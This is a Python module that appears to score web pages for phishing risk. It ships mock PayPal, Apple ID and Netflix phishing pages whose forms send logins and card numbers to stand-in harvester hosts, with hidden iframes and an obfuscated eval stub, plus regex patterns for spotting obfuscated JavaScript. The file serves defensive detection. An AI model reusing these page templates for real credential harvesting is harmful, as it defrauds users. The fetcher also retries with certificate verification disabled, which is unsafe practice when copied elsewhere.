import requests
import re
import logging
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import tldextract

logger = logging.getLogger("ContentAnalysis")

# Simulated HTML mock repository to verify scrapers on specific offline test URLs
MOCK_HTML_MAP = {
    "login-verify-paypal.com": """
        <!DOCTYPE html>
        <html>
        <head>
            <title>PayPal - Verify Your Account Identity</title>
            <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
        </head>
        <body>
            <div class="login-box">
                <h2>PayPal Secure Verification</h2>
                <form action="https://danger-credential-harvester.net/collect.php" method="POST">
                    <input type="hidden" name="step" value="login_credentials">
                    <input type="hidden" name="token" value="098f6bcd4621d373cade4e832627b4f6">
                    <input type="email" name="email" placeholder="Email Address" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Verify Now</button>
                </form>
            </div>
            <iframe src="http://obscure-hidden-iframe.org/frame" width="1" height="1" style="position:absolute; top:-999px; left:-999px;"></iframe>
            <script>
                var _0x92f1 = ["\x65\x76\x61\x6c", "\x75\x6e\x65\x73\x63\x61\x70\x65"];
                window[_0x92f1[0]](function() {
                    console.log("Obfuscated loading simulation...");
                });
            </script>
        </body>
        </html>
    """,
    "verify-apple-secure.com": """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Apple ID - Sign In to Manage Your Account</title>
        </head>
        <body>
            <h2>Verify Your Apple Identity</h2>
            <form action="" method="POST">
                <input type="hidden" name="flow" value="challenge">
                <input type="text" name="apple_id" placeholder="Apple ID" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="submit" value="Log In">
            </form>
            <div style="display:none">
                <iframe src="http://background-logger.com/logger.js"></iframe>
            </div>
        </body>
        </html>
    """,
    "netflix-login-update.com": """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Netflix - Update Billing Information</title>
            <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
        </head>
        <body>
            <h1>Update Your Payment Credentials</h1>
            <form action="https://compromised-server.com/netflix/steal" method="POST">
                <input type="text" name="card_name" placeholder="Name on Card" required>
                <input type="text" name="card_number" placeholder="Card Number" required>
                <input type="text" name="expiry" placeholder="MM/YY" required>
                <input type="text" name="cvv" placeholder="CVV" required>
                <button type="submit">Update Account</button>
            </form>
        </body>
        </html>
    """
}

def fetch_html_content(url: str) -> tuple[str, int, bool, list[str]]:
    """Fetches the HTML text of the given URL. Handles timeouts, mocks, and SSL errors."""
    # Check if this is a test domain for mock responses
    for test_key, mock_html in MOCK_HTML_MAP.items():
        if test_key in url:
            logger.info("Using mock HTML for URL: %s", url)
            return mock_html, 200, False, []

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5"
    }
    
    # Ensure scheme
    full_url = url
    if not url.startswith(("http://", "https://")):
        full_url = "https://" + url

    # Suppress certificate warnings when verify=False is used
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    ssl_error = False
    redirect_urls = []

    try:
        # First attempt: normal verification
        response = requests.get(full_url, headers=headers, timeout=5, allow_redirects=True, verify=True)
        if response.history:
            redirect_urls = [r.url for r in response.history]
        return response.text, response.status_code, False, redirect_urls
    except requests.exceptions.SSLError as e:
        logger.warning("SSL verification failed for %s. Retrying with verify=False. Error: %s", url, e)
        ssl_error = True
        try:
            # Second attempt: disable SSL verification
            response = requests.get(full_url, headers=headers, timeout=5, allow_redirects=True, verify=False)
            if response.history:
                redirect_urls = [r.url for r in response.history]
            return response.text, response.status_code, True, redirect_urls
        except Exception as ex:
            logger.warning("Failed to fetch HTML content for %s even with verify=False: %s", url, ex)
            return "", 0, True, []
    except Exception as e:
        logger.warning("Failed to fetch HTML content for %s: %s", url, e)
        # Attempt http fallback if https failed
        if full_url.startswith("https://"):
            try:
                http_url = full_url.replace("https://", "http://")
                response = requests.get(http_url, headers=headers, timeout=4, allow_redirects=True, verify=True)
                if response.history:
                    redirect_urls = [r.url for r in response.history]
                return response.text, response.status_code, False, redirect_urls
            except requests.exceptions.SSLError as se:
                logger.warning("SSL verification failed on http fallback redirect for %s. Retrying with verify=False. Error: %s", url, se)
                ssl_error = True
                try:
                    response = requests.get(http_url, headers=headers, timeout=4, allow_redirects=True, verify=False)
                    if response.history:
                        redirect_urls = [r.url for r in response.history]
                    return response.text, response.status_code, True, redirect_urls
                except Exception as ex:
                    logger.warning("HTTP fallback with verify=False failed too for %s: %s", url, ex)
            except Exception as ex:
                logger.warning("HTTP fallback failed too for %s: %s", url, ex)
        return "", 0, ssl_error, []

def analyze_html_content(url: str) -> dict:
    """Parses HTML and extracts features like forms, hidden inputs, scripts, and iframes."""
    html_text, status_code, ssl_error, redirect_urls = fetch_html_content(url)
    
    if not html_text:
        return {
            "status": "failed",
            "error": "Webpage content could not be retrieved (Connection timed out or blocked)",
            "forms_count": 0,
            "external_forms": [],
            "empty_forms": False,
            "hidden_inputs_count": 0,
            "hidden_iframes_count": 0,
            "suspicious_scripts_count": 0,
            "obfuscation_signals": False,
            "title": "",
            "favicon_url": "",
            "ssl_error": ssl_error,
            "feature_score": 60,
            "redirect_count": len(redirect_urls),
            "redirect_urls": redirect_urls
        }

    soup = BeautifulSoup(html_text, "html.parser")
    
    # Parse URL segments to compare domains
    parsed_url = urlparse(url if url.startswith(("http://", "https://")) else "http://" + url)
    page_domain = tldextract.extract(parsed_url.netloc).registered_domain

    # 1. Parse Title & Favicon URL
    title = soup.title.string.strip() if soup.title and soup.title.string else ""
    
    favicon_url = ""
    icon_link = soup.find("link", rel=lambda x: x and any(keyword in x.lower() for keyword in ["icon", "shortcut"]))
    if icon_link and icon_link.get("href"):
        href = icon_link.get("href")
        # Handle relative paths
        if href.startswith("//"):
            favicon_url = "https:" + href
        elif href.startswith("/"):
            favicon_url = f"{parsed_url.scheme}://{parsed_url.netloc}{href}"
        elif not href.startswith(("http://", "https://")):
            favicon_url = f"{parsed_url.scheme}://{parsed_url.netloc}/{href}"
        else:
            favicon_url = href

    # 2. Form analysis
    forms = soup.find_all("form")
    forms_count = len(forms)
    external_forms = []
    empty_forms = False
    credential_forms_count = 0
    
    for f in forms:
        action = f.get("action", "").strip()
        has_password_field = f.find("input", attrs={"type": re.compile(r"^password$", re.I)}) is not None
        if has_password_field:
            credential_forms_count += 1

        if not action:
            # An empty action submits back to the current page and is normal on
            # many legitimate sites. It matters only for credential forms.
            if has_password_field:
                empty_forms = True
            continue
            
        # Check if action posts to a different registered domain
        if action.startswith(("http://", "https://")):
            action_domain = tldextract.extract(action).registered_domain
            if action_domain != page_domain:
                external_forms.append(action)

    # 3. Hidden input fields
    hidden_inputs = soup.find_all("input", type="hidden")
    hidden_inputs_count = len(hidden_inputs)

    # 4. Hidden iframes (width/height 0 or 1, or display: none)
    iframes = soup.find_all("iframe")
    hidden_iframes_count = 0
    for frame in iframes:
        width = frame.get("width", "")
        height = frame.get("height", "")
        style = frame.get("style", "").lower()
        
        is_hidden = False
        if width in ("0", "1") or height in ("0", "1"):
            is_hidden = True
        elif "display:none" in style or "display: none" in style or "visibility:hidden" in style or "visibility: hidden" in style:
            is_hidden = True
        elif "position:absolute" in style and ("top:-" in style or "left:-" in style):
            is_hidden = True
            
        if is_hidden:
            hidden_iframes_count += 1

    # 5. Suspicious JS & Script elements
    scripts = soup.find_all("script")
    suspicious_scripts_count = 0
    obfuscation_signals = False
    
    # Common pattern for JavaScript obfuscator
    obfuscation_patterns = [
        r"\\x[0-9a-fA-F]{2}",  # Hex escapes
        r"eval\s*\(\s*function", # Packed JS
        r"_0x[0-9a-fA-F]+",      # Hex variable names
        r"unescape\s*\("        # Unescape functions
    ]
    
    for s in scripts:
        src = s.get("src", "")
        content = s.string or ""
        
        # Check script source for anomalous features (e.g. unknown domain, highly random chars)
        if src.startswith(("http://", "https://")):
            src_domain = tldextract.extract(src).registered_domain
            trusted_asset_domains = {
                "googleapis.com", "gstatic.com", "cloudflare.com", "jquery.com",
                "bootstrapcdn.com", "githubassets.com", "githubusercontent.com"
            }
            if src_domain != page_domain and src_domain not in trusted_asset_domains:
                suspicious_scripts_count += 1
                
        # Check internal script body for obfuscation patterns
        if content:
            matches = [re.search(pat, content) for pat in obfuscation_patterns]
            if any(matches):
                obfuscation_signals = True

    # 6. Calculate content risk sub-score
    content_risk_points = 0

    if ssl_error:
        content_risk_points += 30
    
    # Action posting to an external server is highly typical of credential harvesters
    if external_forms:
        content_risk_points += 40
        
    # Form with empty action posts back to the same path (or is a placeholder)
    if empty_forms and forms_count > 0:
        content_risk_points += 15
        
    # Excess hidden inputs
    if hidden_inputs_count > 5:
        content_risk_points += 15
    elif hidden_inputs_count > 2:
        content_risk_points += 8
        
    # Hidden iframe redirects / loaders
    if hidden_iframes_count > 0:
        content_risk_points += 20
        
    # External scripts from sketchy sources
    if suspicious_scripts_count > 0:
        content_risk_points += 15
        
    # Minified/packed JavaScript is common on large legitimate websites.
    # Treat it as risky only when combined with a credential collection or
    # external form signal.
    if obfuscation_signals and (credential_forms_count > 0 or external_forms):
        content_risk_points += 25

    content_score = min(100, content_risk_points)

    return {
        "status": "success",
        "forms_count": forms_count,
        "credential_forms_count": credential_forms_count,
        "external_forms": external_forms,
        "empty_forms": empty_forms,
        "hidden_inputs_count": hidden_inputs_count,
        "hidden_iframes_count": hidden_iframes_count,
        "suspicious_scripts_count": suspicious_scripts_count,
        "obfuscation_signals": obfuscation_signals,
        "title": title,
        "favicon_url": favicon_url,
        "ssl_error": ssl_error,
        "feature_score": content_score,
        "redirect_count": len(redirect_urls),
        "redirect_urls": redirect_urls
    }
